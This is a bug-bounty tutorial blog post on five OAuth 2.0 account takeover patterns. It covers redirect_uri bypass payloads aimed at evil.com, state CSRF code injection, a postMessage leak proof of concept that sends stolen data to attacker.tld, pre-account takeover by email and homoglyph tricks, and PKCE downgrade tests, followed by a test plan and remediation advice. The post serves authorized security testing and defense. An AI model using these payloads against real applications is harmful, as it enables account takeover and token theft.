---
date: 2026-07-04
categories:
  - Bug Bounty
  - Web Security
tags:
  - OAuth
  - Account Takeover
  - SSO
  - IDOR
  - Critical
authors:
  - 0x3xp10i73r
description: "Five high-payout OAuth 2.0 account takeover patterns that keep working in 2026 — with exact test cases, payloads, and remediation guidance."
---

# OAuth 2.0 "Dirty Dancing" & State Fixation: 5 High-Payout Account Takeover Patterns

![Abstract dark ink texture](../../assets/images/cover-ink.jpg){ .page-cover-img }

**Published:** 2026-07-04 · **Author:** `0x3xp10i73r` · **Category:** Bug Bounty / Web

---

## Why OAuth Still Pays

OAuth is the most **misimplemented** protocol on the web. It looks simple enough that developers roll their own flow, and complex enough that they get at least one of five things wrong. In the last 18 months, OAuth defects accounted for **three of my five highest payouts** — each was a one-click or zero-click account takeover.

Below are the five patterns, ranked by how often I find them.

<!-- more -->

---

## Pattern 1 — `redirect_uri` Validation Bypass (the classic, still undefeated)

The server validates `redirect_uri` with a **partial** match: `startsWith`, `contains`, or a regex that is not anchored. Or it uses a whitelist but has an **open redirect** on a whitelisted host.

```text
# Baseline (correct)
GET /oauth/authorize?client_id=APP&redirect_uri=https://app.example.com/callback
                                         &response_type=code&scope=openid
# Test these variants — one will land:
https://app.example.com.evil.com/callback
https://evil.com#https://app.example.com/callback
https://app.example.com/callback@evil.com
https://app.example.com/callback/../../../evil
https://app.example.com/callback?next=https://evil.com
https://app.example.com/callback\\@evil.com
https://app.example.com%2f%2eevil.com/callback
https://app.example.com/callback%23@evil.com
https://app.example.com:443%40evil.com/callback
//evil.com/callback (if protocol-relative resolution happens)
https://sub.app.example.com/callback (if subdomains are trusted -> takeover needed)
```

**The kill shot is chaining with an open redirect on any trusted origin:**

```text
https://www.example.com/redirect?url=https://evil.com (registered on the whitelist? NO)
# But if the OAuth server whitelists a PREFIX and the app has an open redirect:
GET /oauth/authorize?...&redirect_uri=https://app.example.com/out?url=https://evil.com
# The code is delivered to app.example.com, which forwards it to evil.com. Game over.
```

**Impact test:** Does the code exchange succeed when delivered to *my* domain? Then I have the victim's `authorization_code` → exchange it for tokens → ATO. On a public program, this is a **P1**.

---

## Pattern 2 — Missing or Unvalidated `state` (CSRF → ATO)

`state` must be **unique per session** and **validated on the callback**. If it is absent, static, or reusable, an attacker can bind **their** authorization code to the **victim's** session.

```text
Attack (classic "login CSRF" / code injection):

1. Attacker authenticates to the victim app with their OWN account.
2. Attacker captures their authorization_code before it is exchanged.
3. Attacker crafts a link that issues the code exchange on the VICTIM's browser:
     https://app.example.com/oauth/callback?code=<ATTACKERS_CODE>&state=<ANY>
4. Victim clicks -> the app links the attacker's IdP identity to the victim's session,
   OR the victim's account may be created/linked to the attacker's identity.
   => The attacker now controls a session they did not create, and can often
      later authenticate "as" the victim, or the victim's data is written into the
      attacker's account (data exfiltration in the other direction).
```

**Where it pays even more:** the *account linking* flow (link Google/GitHub to an existing account). If code injection completes a link to the attacker's identity, the attacker can later **log in as the victim** using their own credentials.

```bash
# How to verify quickly
# 1. Drop "state" entirely — does the flow complete?
# 2. Reuse the same state twice — accepted?
# 3. Is state derived from a cookie that is not HttpOnly/Secure (stealable via XSS/subdomain takeover)?
# 4. Is state checked but not deleted (replayable)?
```

---

## Pattern 3 — Authorization Code / Token Leakage

Codes and tokens leak in places nobody audits:

| Leak Vector | Why It Happens | Test |
| :--- | :--- | :--- |
| **Referer header** | The callback page loads third-party content (analytics, ads, chat widgets) | Check if `code` appears in the URL when a third-party request fires |
| **Browser history / shared machine** | Implicit flow puts `access_token` in the URL fragment | Check `response_type=token` usage |
| **Open redirect on the callback** | Redirect forwards the code | See Pattern 1 |
| **Logs & APM tools** | Full URLs are logged (Datadog, Sentry, ELK) | Look for public log leaks / sentry DSNs |
| **postMessage wildcard** | `targetOrigin: '*'` and the token is POSTed to the opener | Hook `window.addEventListener('message')` in the console |
| **`state` mismatch messages** | Error pages echo the code in an error string | Inspect error rendering |
| **Mobile app deep links** | `myapp://callback?code=` is accessible to other apps (Android) | Check exported activities/intent filters |

```javascript
// postMessage leak PoC — put this in an attacker page that embeds the victim app
window.addEventListener('message', (e) => {
  // Vulnerable: no origin check on the sending side
  fetch('https://attacker.tld/leak?d=' + encodeURIComponent(JSON.stringify(e.data)));
}, false);
```

---

## Pattern 4 — Pre-Account Takeover via Unverified Email / IdP Trust

The single most under-tested pattern. If the app links identities **by email address** without requiring `email_verified == true`, the attacker can pre-claim the victim's email address.

```text
Attack A — Unverified signup + later SSO:
  1. Attacker signs up with victim@company.com using email/password.
     (No email verification required to create the account, or the account is
      created BEFORE verification completes.)
  2. Victim later signs in with "Continue with Google" using victim@company.com.
  3. The app sees the email matches an existing account and MERGES the identities
     (or the attacker's session remains valid alongside the SSO login).
  => Attacker retains access to the victim's account.

Attack B — Attacker-controlled IdP with arbitrary emails:
  1. Some providers let you claim any email in a workspace you administer
     (e.g. certain enterprise SSO directories, or self-hosted IdPs).
  2. Attacker creates an identity with victim@company.com -> OAuth "verified".
  3. App links by email -> ATO.

Attack C — Case / plus-address / unicode confusion:
  Victim@company.com vs victim@company.com (case sensitivity)
  victim+anything@company.com (plus addressing treated as same)
  victіm@company.com (Cyrillic 'і' homoglyph in the local part)

Attack D — Deleted-account fallback:
  Victim deletes their account or an invite expires; attacker registers the *same email*
  (e.g. via a provider that frees the address) and gains the old data/identity.
```

**How I prove it:** register with an address I control, don't verify, and then authenticate via a different provider with the same email. If I end up inside the second identity's account, it's a **P1 ATO**.

---

## Pattern 5 — PKCE Downgrade, `state` Fixation & Mixed-Mode Flows

Public clients (SPAs, mobile) **must** use PKCE. When they do, the attack surface is the *downgrade*.

```text
Tests:
1. Remove code_challenge entirely -> does the flow complete? (PKCE not enforced)
2. code_challenge_method=plain -> accepted? (no S256 enforcement)
3. Unknown code_challenge_method -> silently falls back to plain?
4. Reuse the same code_verifier -> accepted across multiple authorizations?
5. Swap the code_verifier with the attacker's own code_challenge
     -> if the server doesn't bind the challenge to the session, you can exchange
        the victim's code with your own verifier! (This is the real "dirty dancing")
6. Mixed-mode: response_type="code token id_token" — extra tokens in the response
7. Implicit flow (response_type=token) — token in the fragment, visible to JS

Verification tooling:
  burp: intercept /authorize and /token manually; diff the responses
  oauth-dances / oauth-tester: scripted variants of the above
```

---

## The Test Plan I Run On Every OAuth Implementation

```text
PHASE 1 — MAP
  [ ] Identify all clients (client_id values) from JS, mobile apps, and the docs
  [ ] Identify all redirect_uris the server accepts (test with a controlled client if possible)
  [ ] Identify the grant types supported (authorization_code, implicit, client_credentials, device)
  [ ] Check /.well-known/openid-configuration for supported modes and claims

PHASE 2 — BREAK THE AUTHORIZE ENDPOINT
  [ ] redirect_uri bypass variants (Pattern 1)
  [ ] state: missing / static / replayable / not bound (Pattern 2)
  [ ] PKCE downgrade variants (Pattern 5)
  [ ] error handling: what is echoed? what is logged?

PHASE 3 — BREAK THE CALLBACK
  [ ] Referer leakage of code (Pattern 3)
  [ ] postMessage wildcard leaks (Pattern 3)
  [ ] code reuse / code for another user / code without state
  [ ] callback accepts arbitrary client_id or redirect mismatch on exchange

PHASE 4 — BREAK THE MAPPING
  [ ] email_verified enforcement on every provider
  [ ] identity linking by email without proof (Pattern 4)
  [ ] account enumeration via SSO ("this email is already registered")

PHASE 5 — IMPACT
  [ ] Demonstrate a full takeover of a test account I own (never a real user)
  [ ] Document exact preconditions + full request/response chain for the report
```

---

## Remediation Summary (What I Write in Reports)

```text
1. redirect_uri : EXACT string match against a registered, server-side allowlist.
                   No wildcards, no regex, no prefix matching. Reject if not an exact match.
2. state : Cryptographically random, bound to the user's session, single-use,
                   validated before any code exchange, and stored in an HttpOnly cookie.
3. PKCE : Required for ALL clients, S256 only, and the code_verifier must be
                   bound to the session that issued the code_challenge.
4. Tokens : Authorization code flow only (no implicit). Short-lived codes (60s),
                   single-use, bound to client_id + redirect_uri.
5. Identity : Never link by email alone. Require email_verified=true AND a
                   re-authentication step before linking an existing account.
6. Headers : Referrer-Policy: no-referrer on callback pages; CSP with no wildcards;
                   postMessage with explicit origins (never '*').
7. Monitoring : Alert on redirect_uri mismatches, state validation failures, and
                   repeated code-exchange failures per client/account.
```

---

=== "Which one pays the most?"

    In my experience:
    1. **redirect_uri bypass** → usually Critical (one-click ATO of any user)
    2. **Pre-ATO via unverified email** → Critical (zero-click, huge blast radius)
    3. **state / code injection** → High–Critical depending on the linking flow
    4. **Leakage via Referer / postMessage** → Medium–High (needs user interaction)
    5. **PKCE downgrade** → High (usually trivially exploitable on SPAs)

!!! tip "Reporting Tip"
    For OAuth findings, always include: the **exact** precondition list, the **full** authorization URL, the response showing the code, and the exchange request proving you obtained tokens. Reviewers push back hard on these reports — screenshots of the ATO inside the victim's account are what make it land.